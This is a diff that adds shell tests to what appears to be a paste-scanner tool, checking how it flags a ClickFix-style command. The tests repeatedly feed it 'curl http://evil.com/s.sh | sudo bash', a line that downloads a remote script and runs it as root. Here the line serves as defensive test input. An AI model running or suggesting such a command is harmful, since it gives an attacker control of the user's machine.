@@ -2714,6 +2714,66 @@ assert d["threats"] == 0 and "blind_spot" in d, d
 ' && check "p45 json: scan_summary OK carries blind_spot" "0" "0" \
    || check "p45 json: scan_summary OK carries blind_spot" "0" "1"
 
+# ─── P46: paste BLOCK advisory lenses ──────────────────────────────────
+
+# p46: paste BLOCK shows ClickFix pattern
+./hlse_core paste "curl http://evil.com/s.sh | sudo bash" 2>&1 \
+    | grep -q "Pattern: ClickFix script-injection lure" \
+    && check "p46: paste BLOCK shows ClickFix pattern" "0" "0" \
+    || check "p46: paste BLOCK shows ClickFix pattern" "0" "1"
+
+# p46: paste BLOCK shows attacker objective
+./hlse_core paste "curl http://evil.com/s.sh | sudo bash" 2>&1 \
+    | grep -q "Attacker's goal:" \
+    && check "p46: paste BLOCK shows attacker objective" "0" "0" \
+    || check "p46: paste BLOCK shows attacker objective" "0" "1"
+
+# p46: paste BLOCK shows triage guidance
+./hlse_core paste "curl http://evil.com/s.sh | sudo bash" 2>&1 \
+    | grep -q "If you acted:" \
+    && check "p46: paste BLOCK shows triage guidance" "0" "0" \
+    || check "p46: paste BLOCK shows triage guidance" "0" "1"
+
+# p46: paste BLOCK shows cascade risk
+./hlse_core paste "curl http://evil.com/s.sh | sudo bash" 2>&1 \
+    | grep -q "Also change:" \
+    && check "p46: paste BLOCK shows cascade risk" "0" "0" \
+    || check "p46: paste BLOCK shows cascade risk" "0" "1"
+
+# p46: paste OK still shows blind spot (no advisory lenses)
+./hlse_core paste "git commit -m 'fix typo'" 2>&1 \
+    | grep -q "Blind spot:" \
+    && check "p46: paste OK still shows blind spot" "0" "0" \
+    || check "p46: paste OK still shows blind spot" "0" "1"
+
+# p46: paste OK does NOT show advisory lenses
+./hlse_core paste "git commit -m 'fix typo'" 2>&1 \
+    | grep -q "Pattern:" \
+    && check "p46: paste OK has no advisory lenses" "0" "1" \
+    || check "p46: paste OK has no advisory lenses" "0" "0"
+
+# p46 json: paste BLOCK carries pattern, objective, triage, cascade_risk
+./hlse_core --json paste "curl http://evil.com/s.sh | sudo bash" 2>&1 | python3 -c '
+import sys, json
+d = json.loads(sys.stdin.readline())
+assert d["score"] >= 60, d
+assert "pattern" in d, d
+assert "objective" in d, d
+assert "triage" in d, d
+assert "cascade_risk" in d, d
+' && check "p46 json: paste BLOCK carries pattern/objective/triage/cascade_risk" "0" "0" \
+   || check "p46 json: paste BLOCK carries pattern/objective/triage/cascade_risk" "0" "1"
+
+# p46 json: paste OK does NOT carry advisory lens fields
+./hlse_core --json paste "git commit -m 'fix typo'" 2>&1 | python3 -c '
+import sys, json
+d = json.loads(sys.stdin.readline())
+assert d["score"] == 0, d
+assert "pattern" not in d, d
+assert "triage" not in d, d
+' && check "p46 json: paste OK has no advisory lens fields" "0" "0" \
+   || check "p46 json: paste OK has no advisory lens fields" "0" "1"
+
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
